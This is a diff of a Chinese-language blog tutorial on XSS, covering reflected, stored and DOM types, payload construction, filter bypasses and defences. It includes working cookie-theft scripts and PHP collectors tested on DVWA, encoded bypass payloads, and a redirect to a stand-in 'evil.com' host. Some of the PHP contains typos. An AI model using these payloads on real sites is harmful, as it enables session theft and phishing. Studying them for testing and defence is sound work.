@@ -8,18 +8,28 @@
   <link rel="dns-prefetch" href="http://example.com">
   <title>XSS注入原理与实践进阶 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="扩展需要一个前端页面，能够给用户进行输入用户信息 需要有一个后端页面，能够接收用户输入，并且将用户对应信息输出。 流量劫持：将A站的流量引流到B站。原来要访问A，结果访问B。 window.location.href&#x3D;b 获取用户cookie document.cookie 篡改、删除页面信息(钓鱼) document.getElementByTagName(body)[0].innerhtml&#x3D;">
+  <meta name="description" content="XSS的原理与分类XSS漏洞简介（1）跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。 （2）危害：  流量劫持：将A站的流量引流">
 <meta property="og:type" content="article">
 <meta property="og:title" content="XSS注入原理与实践进阶">
 <meta property="og:url" content="http://example.com/2021/04/27/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/XSS%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5%E8%BF%9B%E9%98%B6/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="扩展需要一个前端页面，能够给用户进行输入用户信息 需要有一个后端页面，能够接收用户输入，并且将用户对应信息输出。 流量劫持：将A站的流量引流到B站。原来要访问A，结果访问B。 window.location.href&#x3D;b 获取用户cookie document.cookie 篡改、删除页面信息(钓鱼) document.getElementByTagName(body)[0].innerhtml&#x3D;">
+<meta property="og:description" content="XSS的原理与分类XSS漏洞简介（1）跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。 （2）危害：  流量劫持：将A站的流量引流">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2021/05/10/EnlLXaf3U1hNZbt.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/10/b7gqRfM5L9xUjTl.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/10/2Csa9wNjvockUy4.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/10/ewrCnLBZ4RDXgJk.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/10/RCrqI7XtH6BpKai.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/10/BQvSz2LPUHNXYAk.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/10/wHmLseF3xdoG8q2.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/10/5fWYCLZgkwcOmjT.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/10/Vp1G8hvEzOfBkHI.png">
 <meta property="article:published_time" content="2021-04-27T12:53:18.000Z">
-<meta property="article:modified_time" content="2021-04-27T14:02:05.448Z">
+<meta property="article:modified_time" content="2021-05-13T12:09:49.001Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="安全进阶">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/05/10/EnlLXaf3U1hNZbt.png">
   
     <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -175,14 +185,342 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><p>需要一个前端页面，能够给用户进行输入用户信息</p>
+        <h2 id="XSS的原理与分类"><a href="#XSS的原理与分类" class="headerlink" title="XSS的原理与分类"></a>XSS的原理与分类</h2><h3 id="XSS漏洞简介"><a href="#XSS漏洞简介" class="headerlink" title="XSS漏洞简介"></a>XSS漏洞简介</h3><p>（1）跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。<strong>恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码<br>会被执行，从而达到恶意攻击用户的目的。</strong></p>
+<p>（2）危害：</p>
+<ul>
+<li>流量劫持：将A站的流量引流到B站。原来要访问A，结果访问B。</li>
+</ul>
+<pre><code>window.location.href=b</code></pre>
+<ul>
+<li>获取用户cookie信息，盗取账号</li>
+</ul>
+<pre><code>document.cookie</code></pre>
+<ul>
+<li>篡改、删除页面信息（钓鱼）</li>
+</ul>
+<pre><code>使页面为空：Document.getElementByTagName(&#39;body&#39;)[0].innerHTML=&#39;&#39;
+document.getElementByTagName(body)[0].innerhtml=&#39;&#39;将原有页面内容置空，变成一个空页面。</code></pre>
+<ul>
+<li>配合CSRF攻击，实施进一步的攻击</li>
+</ul>
+<p>（3）跨站脚本注入漏洞产生的根本原因是由于WEB服务端读取了<strong>用户可控数据输出到HTML页面的过程中没有进行安全处理</strong>导致的。<br>用户可控数据：所有来自客户端的数据都可以被客户端控制，包括<strong>url、参数、HTTP头部字段（cookie、referer、HOST等）、请求正文</strong>等都属于用户可控数据。</p>
+<p>（4）学习XSS注入漏洞需要关注的点：  </p>
+<ul>
+<li>用户可控输入的位置：用户哪一项可控输入被读取？</li>
+<li>处理用户输入的代码在什么位置？</li>
+<li>用户输入是否经过存储？</li>
+<li>输出的页面是哪一个？</li>
+<li>输出的内容位于页面的哪个位置？</li>
+</ul>
+<p><img src="https://i.loli.net/2021/05/10/EnlLXaf3U1hNZbt.png" alt="image-20210510095948192"></p>
+<p>注：通常XSS注入并<strong>不能对服务器产生直接的危害</strong>，而是通过<strong>攻击客户端（其他用户）</strong>来达到攻击目标。</p>
+<h3 id="XSS的分类"><a href="#XSS的分类" class="headerlink" title="XSS的分类"></a>XSS的分类</h3><p><strong>基于用户可控数据的来源和输出的位置，可以将XSS分为三类：</strong></p>
+<p>（1）反射型XSS：直接将HTTP请求中的用户可控数据输出到HTML页面中的跨站脚本注入，由于用户可控数据没有被存储，因此只能在单次请求中生效。</p>
+<p>（2）存储型XSS：又叫持久型XSS，直接将HTTP请求中的<strong>用户可控数据存储至数据库中</strong>，再从数据库中读取出来输出到HTML页面上，由于数据经过存储，可以持续被读取，攻击影响面和危害都较高</p>
+<p>（3）DOM-XSS：特殊的跨站，将用户可控数据通过JavaScript和DOM技术输出到HTML中，利用方式通常与反射型XSS类似</p>
+<table>
+<thead>
+<tr>
+<th align="center">类型</th>
+<th align="center">获取用户输入</th>
+<th align="center">输出位置</th>
+<th align="center">攻击代码</th>
+<th align="center">攻击触发</th>
+<th align="center">处理代码位置</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">反射型</td>
+<td align="center">HTTP请求</td>
+<td align="center">当前响应页面</td>
+<td align="center">不存储</td>
+<td align="center">必须带攻击代码</td>
+<td align="center">服务端</td>
+</tr>
+<tr>
+<td align="center">存储型</td>
+<td align="center">HTTP请求(输入)/数据库(输出)</td>
+<td align="center">可能在其他响应页面</td>
+<td align="center">存储</td>
+<td align="center">无需携带攻击代码</td>
+<td align="center">服务端</td>
+</tr>
+<tr>
+<td align="center">DOM型</td>
+<td align="center">浏览器本地</td>
+<td align="center">当前页面</td>
+<td align="center">不存储</td>
+<td align="center">必须带攻击代码</td>
+<td align="center">客户端</td>
+</tr>
+</tbody></table>
+<h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>反射型XSS也被称为非持久性XSS，当用户访问一个带有XSS代码的HTML请求时，服务器端接收数据后处理，然后把带有XSS的数据发送到浏览器，浏览器解析这段带有XSS代码的数据后，就造成XSS漏洞，这个过程就像一次反射，所以<br>叫反射型XSS。</p>
+<h4 id="反射型XSS常见位置"><a href="#反射型XSS常见位置" class="headerlink" title="反射型XSS常见位置"></a>反射型XSS常见位置</h4><p>反射型跨站常见的出现位置：<strong>用户登录、搜索框、订单提交</strong>等位置经常会引用客户可控输入，如果没有进行很好的处理很容易出现反射型跨站漏洞，URL本身常见的跨站注入点。</p>
+<h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>存储型XSS又被称为持久性XSS，存储型XSS是最危险的一种跨站脚本漏洞，当攻击者提交一段 XSS代码后，被服务端接收并存储，当攻击者或用户再次访问某个页面时，这段XSS代码被程序读出来响应给浏览器，造成XSS跨站攻击，这是存储型XSS。</p>
+<p>1、攻击者在留言板中提交一段XSS代码，服务端接收后并进行存储；</p>
+<p>2、当管理员查看留言板时便触发了XSS代码，形成XSS跨站攻击；</p>
+<h4 id="存储型XSS常见位置"><a href="#存储型XSS常见位置" class="headerlink" title="存储型XSS常见位置"></a>存储型XSS常见位置</h4><p>存储型跨站常见的出现位置：<strong>用户留言、评论、用户昵称、用户信息</strong>等凡是可以提交数据由服务器进行存储和显示的位置都有可能出现存储型跨站。</p>
+<h4 id="利用存储型XSS实现手工盗取cookie"><a href="#利用存储型XSS实现手工盗取cookie" class="headerlink" title="利用存储型XSS实现手工盗取cookie"></a>利用存储型XSS实现手工盗取cookie</h4><p><strong>方法一：</strong></p>
+<ul>
+<li>JavaScript脚本</li>
+</ul>
+<pre><code class="javascript">&lt;script&gt;document.location=&quot;http://127.0.0.1/getCookie.php?cookie=&quot;+document.cookie;&lt;/script&gt;</code></pre>
+<ul>
+<li>getCookie.php脚本</li>
+</ul>
+<pre><code class="php">&lt;?php
+$cookie = $_GET[&#39;cookie&#39;];
+$log = fopen(&quot;cookie.txt&quot;, &quot;w&quot;);
+fwrite($log, $cookie .&quot;\n&quot;);
+fclose($log);
+echo &quot;攻击成功&quot;;
+?&gt;</code></pre>
+<p>（1）利用DVWA作为实验环境，将DVWA Security设置为low。在XSS Stored模块的留言板上留言。</p>
+<p>（2）由于存在输入的字符长度限制，因此通过修改源码突破该限制。然后输入JavaScript脚本。</p>
+<p><img src="https://i.loli.net/2021/05/10/b7gqRfM5L9xUjTl.png" alt="image-20210510103842802"></p>
+<p>（3）页面发生跳转，后台的cookie文件获取到用户的cookie值。</p>
+<p><img src="https://i.loli.net/2021/05/10/2Csa9wNjvockUy4.png" alt="image-20210510104045000"></p>
+<p><img src="https://i.loli.net/2021/05/10/ewrCnLBZ4RDXgJk.png" alt="image-20210510104119313"></p>
+<p><strong>方法二：AJAX</strong></p>
+<ul>
+<li>JavaScript脚本</li>
+</ul>
+<pre><code class="html">&lt;script&gt;
+var url=&quot;http://127.0.0.1/cookie1.php&quot;;
+var data=&quot;cookie=&quot;+document.cookie;
+var nxhr=new XMLHttpRequest();
+nxhr.setRequestHeader(&quot;content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);
+nxhr.send(data);
+&lt;/script&gt;</code></pre>
+<ul>
+<li>cookie1.php</li>
+</ul>
+<pre><code class="php">&lt;?php
+data_default_timezone_set(&quot;Asia/shanghai&quot;);
+$cookie=$_POST[&#39;cookie&#39;];
+$time=data(&quot;Y-m-d H:i&quot;);
+echo $time;
+$refer=$_SERVER[&#39;HTTP_REFERER&#39;];
+$content=$time.&quot;::&quot;.&quot;$refer&quot;.&quot;::&quot;.$cookie.&quot;\r\n&quot;;
+file_put_contents(&quot;cookie.txt&quot;,$content,FILE_APPEND);
+?&gt;</code></pre>
+<h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p>（1）XSS利用DOM的结构定义</p>
+<p>（2）DOM结构是将HTML文件的节点构建成树状结构，以此反应HTML本身的阶层结构。用过构造javascript恶意语句就可以修改HTML的DOM结构中的某个值，从而触发跨站脚本攻击。</p>
+<pre><code class="html">&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;DOM XSS&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;a href=&quot;我的链接&quot;/&gt;
+&lt;h1&gt;我的标题&lt;/h1&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<p><img src="https://i.loli.net/2021/05/10/RCrqI7XtH6BpKai.png" alt="image-20210510194453253"></p>
+<p>（3）HTML DOM的方法</p>
+<ul>
+<li>getElementById()：                  返回带有指定ID的元素</li>
+<li>getElementsByTagName()：    返回包含带有指定标签名称的所有元素的节点列表</li>
+<li>getElementsByClassName() ：返回包含带有指定类名的所有元素的节点列表</li>
+<li>setAttribute()：                         把指定属性设置或修改为指定的值</li>
+</ul>
+<h4 id="利用DOM结构修改节点值"><a href="#利用DOM结构修改节点值" class="headerlink" title="利用DOM结构修改节点值"></a>利用DOM结构修改节点值</h4><p>（1）例子：</p>
+<ul>
+<li>当有id存在时</li>
+</ul>
+<pre><code class="html">&lt;p id=&quot;ndsec&quot;&gt;done&lt;/p&gt;
+&lt;script&gt;
+x=document.getElementById(&quot;ndsec&quot;);   //x=document.getElementById(&quot;ID属性的值&quot;);
+document.write(x.innerHTML);      //x的值为doone
+&lt;/script&gt;  </code></pre>
+<ul>
+<li>当没有id时</li>
+</ul>
+<pre><code class="html">&lt;a href=http://www.baidu.com&gt;1&lt;/a&gt;
+&lt;script&gt;
+document.getElementsByTagName(&quot;a&quot;)[0].href=&quot;http://www.doone.com.cn&quot;;
+//getElementsByTagName(&quot;标签名&quot;)[第几个标签].要修改的属性名
+//最终http://www.baidu.com被替换成http://www.done.com.cn
+&lt;/script&gt;</code></pre>
+<ul>
+<li>XSS语句插入的位置在要修改DOM节点之前</li>
+</ul>
+<pre><code class="html">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;meta charset=&quot;utf-8&quot;&gt;
+&lt;title&gt;NewDoone&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;script&gt;
+ /*HTML语句是从上往下执行的，如果只是用一行语句，则当要修改的DOM节点的语句还未执行时，是不会生效的。
+ 这里使用两个语句，第一行语句指当body语句执行完成之后，触发onload则执行函数里的语句。而触发onload时，DOM语句已经加载完毕。
+ */
+document.getElementsByTagName(&quot;body&quot;)[0].onload=function 
+changeLink()&#123;document.getElementsByTagName(&quot;a&quot;)[1].href=&quot;http://www.doone.com.cn&quot;;&#125;
+//当要修改事件属性如onload或onclick属性，需要用定义一个函数function xx()&#123;&#125;的写法。
+&lt;/script&gt;
+&lt;a id= &quot;abc1&quot; href=http://www.baidu.com&gt;test1&lt;/a&gt;
+&lt;a id= &quot;abc2&quot; href=http://www.baidu.com&gt;test2&lt;/a&gt;
+&lt;a id= &quot;abc3&quot; href=http://www.baidu.com&gt;test3&lt;/a&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<p>（2）XSS利用DOM修改登陆页面忘记密码的链接。</p>
+<pre><code class="html">http://xxx/login.php?url=index.php&quot;/&gt;&lt;script&gt;document.getElementsByTagName(&quot;body&quot;)[0].onload=function 
+changeLink()&#123;document.getElementsByTagName(&quot;input&quot;)[3].onclick=function xss()&#123;window.location.href=&#39;http://www.doone.com.cn&#39;;&#125;;&#125;&lt;/script&gt;&lt;from&quot;</code></pre>
+<h2 id="XSS的渗透思路"><a href="#XSS的渗透思路" class="headerlink" title="XSS的渗透思路"></a>XSS的渗透思路</h2><h3 id="XSS的Payload构造"><a href="#XSS的Payload构造" class="headerlink" title="XSS的Payload构造"></a>XSS的Payload构造</h3><p>（1）构造XSS Payload是测试XSS注入攻击的核心工作，针对可疑的注入点，我们需要根据用户可控输入的输出位置采用不同的方式尝试构造Payload，并根据应用的安全防护规则调整payload，根据返回结果判断漏洞是否存在以及风险的高低程度。</p>
+<p>（2）根据输出位置选择payload构造方式</p>
+<ul>
+<li>空白位置：插入新的script标签</li>
+<li>HTML标签中：闭合标签并建立新的script标签</li>
+<li>HTML标签属性中：闭合标签属性插入新的属性</li>
+<li>JavaScript中：闭合JavaScript语句并写入新的语句</li>
+<li>css中：闭合css标签属性并插入新的script标签</li>
+</ul>
+<p>（3）根据过滤规则调整payload</p>
+<ul>
+<li>大小写</li>
+<li>编码</li>
+<li>双写</li>
+<li>特殊的脚本标签</li>
+<li>事件属性执行脚本</li>
+<li>仅插入标签</li>
+</ul>
+<p>（4）根据返回结果判断漏洞是否存在以及风险的高低程度</p>
+<ul>
+<li>可执行任意脚本代码：严重风险</li>
+<li>可执行有限制的脚本代码：高风险</li>
+<li>只可插入标签无法执行脚本代码：中风险</li>
+<li>可改变HTML结构但无法插入完整标签：低风险</li>
+<li>无法插入有危险的内容：无漏洞</li>
+</ul>
+<h3 id="XSS的基本payload"><a href="#XSS的基本payload" class="headerlink" title="XSS的基本payload"></a>XSS的基本payload</h3><p>（1）利用&lt; &gt;标记注入Html/Javascript。</p>
+<pre><code>&lt;script&gt;[code]&lt;/script&gt;  --&gt; &lt;script&gt;alert(/xss/)&lt;/script&gt;</code></pre>
+<p>（2）利用HTML标签属性值执行XSS。</p>
+<pre><code>         &lt;HTML标记  javascript:[code]&gt; 
+---&gt;     &lt;img src=&quot;javascript:alert(&#39;1&#39;); &quot;&gt;  （IE6版本）
+         &lt;a href=&quot;javascript:alert(1)&quot;&gt;</code></pre>
+<p>（3）通过事件来触发XSS。</p>
+<pre><code> &lt;HTML标记 on事件=code&gt; 如---&gt; &lt;img src=1 onerror=&quot;window.location.href=&#39;http://www.baidu.com&#39;&quot;/&gt;
+ 或&lt;img src=1 onerror=&quot;javascript:alert(666)&quot;&gt;</code></pre>
+<h3 id="JavaScript伪协议"><a href="#JavaScript伪协议" class="headerlink" title="JavaScript伪协议"></a>JavaScript伪协议</h3><p><strong>javascript:这个特殊的协议类型声明了URL的主体是任意的javascript代码，它由javascript的解释器运行</strong></p>
+<pre><code>javascript:URL</code></pre>
+<p>（1）将javascript代码添加到客户端的方法是把它放置在伪协议说明符javascript:后的URL中。如果javascript:URL中的javascript代码含有多个语句，必须使用分号将这些语句分隔开。这样的URL如下所示：</p>
+<pre><code>javascript:var now = new Date(); &quot;&lt;h1&gt;The time is:&lt;/h1&gt;&quot; + now;</code></pre>
+<p>（2）当浏览器装载了这样的URL时，它将执行这个URL中包含的javascript代码，并把最后一条javascript语句的字符串值作为新文档的内容显示出来。这个字符串值可以含有HTML标记，并被格式化，其显示与其他装载进浏览器的文档完全相同。</p>
+<p>（3）javascript URL还可以含有只执行动作，但不返回值的javascript语句。例如：</p>
+<pre><code>javascript:alert(&quot;hello world!&quot;)
+//装载了这种URL时，浏览器仅执行其中的javascript代码，但由于没有作为新文档来显示的值，因此它并不改变当前显示的文档</code></pre>
+<h3 id="payload构造实例"><a href="#payload构造实例" class="headerlink" title="payload构造实例"></a>payload构造实例</h3><p>（1）闭合标签：在具体的实战中，通过闭合标签，使输入的基本语句得以实现。</p>
+<p><img src="https://i.loli.net/2021/05/10/BQvSz2LPUHNXYAk.png" alt="image-20210510213017214"></p>
+<p>（2）闭合引号：在具体的实战中，通过闭合单/双引号，使输入的基本语句得以实现。</p>
+<p><img src="https://i.loli.net/2021/05/10/wHmLseF3xdoG8q2.png" alt="image-20210510213112179"></p>
+<h2 id="XSS绕过防护的技巧"><a href="#XSS绕过防护的技巧" class="headerlink" title="XSS绕过防护的技巧"></a>XSS绕过防护的技巧</h2><h3 id="针对输入输出的防护机制"><a href="#针对输入输出的防护机制" class="headerlink" title="针对输入输出的防护机制"></a>针对输入输出的防护机制</h3><p>在具体的实战中，构造的基本语句往往不能直接实现，因为存在防护机制。</p>
+<p><img src="https://i.loli.net/2021/05/10/5fWYCLZgkwcOmjT.png" alt="image-20210510213512262"></p>
+<h3 id="XSS防护规则的判断与绕过"><a href="#XSS防护规则的判断与绕过" class="headerlink" title="XSS防护规则的判断与绕过"></a>XSS防护规则的判断与绕过</h3><p>为了避免XSS漏洞的存在，通常应用会对用户输入进行一定的安全处理后再输出的HTML中，在进行XSS漏洞测试时需要推测出应用的安全处理方法（即防护规则），并采用对应的绕过方式来进行绕过测试。通常防护规则会检测输入中是否有html标签或脚本的关键字并进行处理，根据处理方法的不同可分为过滤、编码、删除、插入等，有时会使用多种方法共同防护。</p>
+<p><img src="https://i.loli.net/2021/05/10/Vp1G8hvEzOfBkHI.png" alt="image-20210510213848138"></p>
+<h3 id="XSS绕过规则之符号与关键字"><a href="#XSS绕过规则之符号与关键字" class="headerlink" title="XSS绕过规则之符号与关键字"></a>XSS绕过规则之符号与关键字</h3><p>（1）利用符号判断语句：’’;!–”&lt;XSS&gt;=&amp;{()}</p>
+<p>（2）关键字判断：script、alert、javascript、expression等……</p>
+<p>（3）常见事件属性：</p>
+<ul>
+<li>onerror</li>
+<li>onmouseover</li>
+<li>onclick</li>
+<li>onload</li>
+<li>oninput</li>
+<li>oncut</li>
+<li>onscroll</li>
+</ul>
+<p>（4）alert()的替代词：confirm()、prompt()</p>
+<h3 id="XSS绕过方式"><a href="#XSS绕过方式" class="headerlink" title="XSS绕过方式"></a>XSS绕过方式</h3><p>（1）大小写绕过</p>
+<pre><code>&lt;img src=&quot;javascript:alert(0) ;&quot;&gt;
+&lt;IMG SRC=&quot;javascript:alert(0) ;&quot;&gt;
+&lt;iMg sRC=&quot;jaVasCript:alert(0);&quot;&gt;
+&lt;img src=1 onerror=&quot;alert(/1/)&quot;&gt;
+&lt;iMg sRc=1 oNerror=&quot;alert(/1/)&quot;&gt;</code></pre>
+<p>（2）双写绕过</p>
+<pre><code>&lt;script&gt;alert(/xss/)&lt;/script&gt;
+&lt;&gt;alert(/xss/)&lt;/&gt;
+&lt;scrscriptipt&gt;alert(/xss/)&lt;/scrscriptipt&gt;
+&lt;img src=1 onerror=&quot;alert(/1/)&quot;&gt;
+&lt;img src=1 oonnerror=&quot;alert(/1/)&quot;&gt;</code></pre>
+<p>（3）对标签属性值变换成ASCII码</p>
+<ul>
+<li>ASCII编码也就是十进制编码</li>
+<li>如t的ASCII为116，用&amp;#116表示</li>
+<li>冒号：则表示为&amp;#58</li>
+</ul>
+<pre><code>&lt;img src=&quot;javascript:alert(0) ;&quot;&gt;
+&lt;img src=&quot;javascrip&amp;#116&amp;#58alert(0) ;&quot;&gt;
+&lt;a href=javascript:alert(1)&gt;
+&lt;a 
+href=&amp;#106&amp;#97&amp;#118&amp;#97&amp;#115&amp;#99&amp;#11
+4&amp;#105&amp;#112&amp;#116&amp;#58&amp;#97&amp;#108&amp;#101&amp;
+#114&amp;#116&amp;#40&amp;#49&amp;#41&gt;</code></pre>
+<p>（4）对标签属性值进行十六进制编码。如a的十六进制编码为&amp;#x61，利用方式和ASCII编码一致。</p>
+<pre><code>&lt;a 
+href=&amp;#x6a&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#
+x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3a&amp;#x61&amp;#x6c&amp;#x6
+5&amp;#x72&amp;#x74&amp;#x28&amp;#x31&amp;#x29&gt;</code></pre>
+<p>（5）空格替代</p>
+<ul>
+<li>空格可以使用多种字符来进行代替</li>
+<li>如/、//、%0a、%0d、Table键出来的空白替代空格。</li>
+</ul>
+<p>（6）Base64编码</p>
+<ul>
+<li>如&lt;script&gt;alert(“Hello”);&lt;/script&gt;</li>
+<li>经过Base64编码后：PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=</li>
+</ul>
+<pre><code>&lt;object
+data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=&quot;&gt;
+
+&lt;META HTTP-EQUIV=&quot;refresh&quot;CONTENT=&quot;0;url=data:text/
+html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=&quot;&gt;</code></pre>
+<p>（7）base64,16进制,10进制,编码再使用eval()、window[atob()]函数执行</p>
+<ul>
+<li>如：alert(‘XSS’);</li>
+<li>经过JS 16进制编码后：\x61\x6c\x65\x72\x74\x28\x27\x58\x53\x53\x27\x29\x3b\xa</li>
+</ul>
+<pre><code>&lt;script&gt;eval(&quot;\x61\x6c\x65\x72\x74\x28\x27\x58\x53\x53\x27\x29\x3b&quot;)&lt;/script&gt;</code></pre>
+<ul>
+<li>window[atob(‘eval’)]</li>
+</ul>
+<pre><code>&lt;script&gt;window[atob(&#39;ZXZhbA==&#39;)](&quot;\x61\x6c\x65\x72\x74\x28\x27\x58\x53\x53\x27\x29\x3b&quot;);&lt;/script&gt;</code></pre>
+<p>（8）参数间接传值</p>
+<ul>
+<li><p>思路：输入的语句并不会直接执行带有恶意的XSS payload语句，而是通过传递恶意语句到某些参数从而达到间接执行的目的。</p>
+</li>
+<li><p>例1：<a target="_blank" rel="noopener" href="http://www.evil.com这个网站是一个恶意页面.http//10.10.10.135/xss/test.php%E8%BF%99%E6%98%AF%E4%B8%80%E4%B8%AA%E6%99%AE%E9%80%9A%E7%9A%84%E6%B5%8B%E8%AF%95%E9%A1%B5%E9%9D%A2%E3%80%82">http://www.evil.com这个网站是一个恶意页面。http://10.10.10.135/xss/test.php这是一个普通的测试页面。</a></p>
+<pre><code>http://10.10.10.135/xss/test.php?name=test&lt;input name=&quot;http://www.evil.com&quot;             
+value=&quot;xsstest&quot; oninput=&quot;window.location=this.name&quot;&gt;
+
+http://www.evil.com可以直接替换成恶意语句如：javascript:alert(1)。</code></pre>
+</li>
+<li><p>例2（IE &lt;=8版本）</p>
+<pre><code>http://10.10.10.135/xss/test.php?name=test&lt;a href=&quot;123&quot; id=&quot;x&quot;&gt;test&lt;/a&gt;&lt;script&gt;x=&#39;javascript:alert(1)&#39;&lt;/script&gt;&lt;script&gt;x.toString()==&#39;123&#39;&lt;/script&gt;</code></pre>
+</li>
+</ul>
+<h2 id="XSS漏洞的防御"><a href="#XSS漏洞的防御" class="headerlink" title="XSS漏洞的防御"></a>XSS漏洞的防御</h2><p>（1）XSS的威力主要是取决于JavaScript能够实现的程度，XSS跨站脚本的形成原因是对输入输出没有严格过滤，导致在页面上可以执行JavaScript等客户端代码，所以只要将敏感字符过滤，就可以修复XSS跨站漏洞。</p>
+<p>（2）修复和防范方法：</p>
+<ul>
+<li>Web客户端和服务端对用户的输入输出进行过滤或转义，如：&lt;，&gt;，script；</li>
+<li>浏览器设置为高安全级别，Cookie属性HttpOnly设置为true，浏览器将禁止 javascript访问带有HttpOnly属性的cookie；</li>
+<li>Web服务器安装WAF/IDS/IPS等产品，拦截攻击代码；</li>
+<li>关闭浏览器自动密码填写功能，防止被钓鱼页面、表单调取账号密码；</li>
+</ul>
+<p>（3）例：实现过滤特殊字符（图为DVWA中xss模块防御源码）：</p>
+<pre><code class="php">&lt;?php 
+header (&quot;X-XSS-Protection: 0&quot;); 
+// Is there any input? 
+if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] != NULL ) &#123; 
+    // Get input 
+    $name = preg_replace( &#39;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] ); 
+    // Feedback for end user 
+    echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;; 
+&#125; 
+?&gt; </code></pre>
+<h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><p>需要一个前端页面，能够给用户进行输入用户信息</p>
 <p>需要有一个后端页面，能够接收用户输入，并且将用户对应信息输出。</p>
-<p>流量劫持：将A站的流量引流到B站。原来要访问A，结果访问B。</p>
-<p>window.location.href=b</p>
-<p>获取用户cookie</p>
-<p>document.cookie</p>
-<p>篡改、删除页面信息(钓鱼)</p>
-<p>document.getElementByTagName(body)[0].innerhtml=’’将原有页面内容置空，变成一个空页面。</p>
 
       
 
@@ -297,8 +635,8 @@
     </a>
   
   
-    <a href="/2021/04/24/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/MSSSQL%E7%9A%84%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">MSSSQL的手工注入</div>
+    <a href="/2021/04/24/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/MSSQL%E7%9A%84%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">MSSQL的手工注入</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -325,7 +663,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%A9%E5%B1%95"><span class="toc-number">1.</span> <span class="toc-text">扩展</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%86%E7%B1%BB"><span class="toc-number">1.</span> <span class="toc-text">XSS的原理与分类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="toc-number">1.1.</span> <span class="toc-text">XSS漏洞简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS%E7%9A%84%E5%88%86%E7%B1%BB"><span class="toc-number">1.2.</span> <span class="toc-text">XSS的分类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8BXSS"><span class="toc-number">1.3.</span> <span class="toc-text">反射型XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E5%B8%B8%E8%A7%81%E4%BD%8D%E7%BD%AE"><span class="toc-number">1.3.1.</span> <span class="toc-text">反射型XSS常见位置</span></a></li></ol></li><li class="toc-item toc-level-3"><a 